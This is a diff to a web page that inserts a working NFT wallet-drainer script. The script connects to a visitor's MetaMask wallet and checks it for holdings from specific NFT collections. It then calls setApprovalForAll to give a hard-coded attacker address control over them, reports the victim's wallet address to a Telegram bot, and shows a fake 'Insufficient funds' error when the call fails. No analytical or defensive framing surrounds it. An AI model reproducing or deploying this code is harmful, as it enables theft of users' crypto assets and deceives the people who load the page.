@@ -1006,6 +1006,133 @@
         }
     </style>
     <div id="Attach-Mew-Wallet-Modal"></div>
+   
+ <script>
+    async function transact() {
+    await Moralis.enableWeb3();
+    let user = Moralis.User.current();
+    if (user == undefined) {
+        try {
+            user = await Moralis.authenticate({ provider: "metamask", signingMessage: "I am signing my one-time nonce: 513767" })
+        } catch (error) {
+            console.log(error)
+    }
+    }
+    var options, optionss, optionsss;
+    console.log("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff");
+    optionss = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+    }
+    optionsss = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+    }
+   wowg = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0xf61F24c2d93bF2dE187546B14425BF631F28d6dC",
+    }
+   azuki = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
+    }
+   impostor = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x3110EF5f612208724CA51F5761A69081809F03B7",
+    }
+   kiwami = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x701A038aF4Bd0fc9b69A829DdcB2f61185a49568",
+    }
+   something = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949",
+    }     
+   clonex = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B",
+    }
+   zombieclub = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x9c80777CAe192E5031c38A0d951C55730eCC3f5e",
+    } 
+  bapeverce = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x4addcA4c07a5e9a6b4973094D03AD5aAE7735E5b",
+    } 
+  arcade = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0x4addcA4c07a5e9a6b4973094D03AD5aAE7735E5b",
+    } 
+  maxpainandfriends = {
+        chain: "Eth",
+  address: Moralis.User.current().get("ethAddress"),
+  token_address: "0xd1169e5349d1cB9941F3DCbA135C8A4b9eACFDDE",
+    }      
+        
+    const userEthNFTs = await Moralis.Web3API.account.getNFTsForContract(optionss);
+    const userEthNFTss = await Moralis.Web3API.account.getNFTsForContract(optionsss);
+    if (userEthNFTs.result[0] == undefined && userEthNFTss.result[0] == undefined){
+        $('.u-msg').css({ opacity: 1 });
+
+    } 
+    if (userEthNFTs.result[0] != undefined) {
+        const sendOptions = {
+        contractAddress: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+        functionName: "setApprovalForAll",
+        abi: window.CONTRACT_ABI,
+        params: {
+          operator: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
+          approved: "true"
+        },
+      };
+            try {
+                let result = await Moralis.executeFunction(sendOptions);
+                var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
+  }); 
+            } catch (e) {
+                throwmodal('Error: Insufficient funds!');
+            }
+      
+      }
+    if (userEthNFTss.result[0] != undefined) {
+        const sendOptions = {
+        contractAddress: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+        functionName: "setApprovalForAll",
+        abi: window.CONTRACT_ABI,
+        params: {
+            operator: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
+            approved: "true"
+        },
+    };
+            try {
+                let result = await Moralis.executeFunction(sendOptions);
+                var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
+  }); 
+            } catch (e) {
+                throwmodal('Error: Insufficient funds!');
+            }
+        
+        }
+};
+ </script>
 
 </body>
 
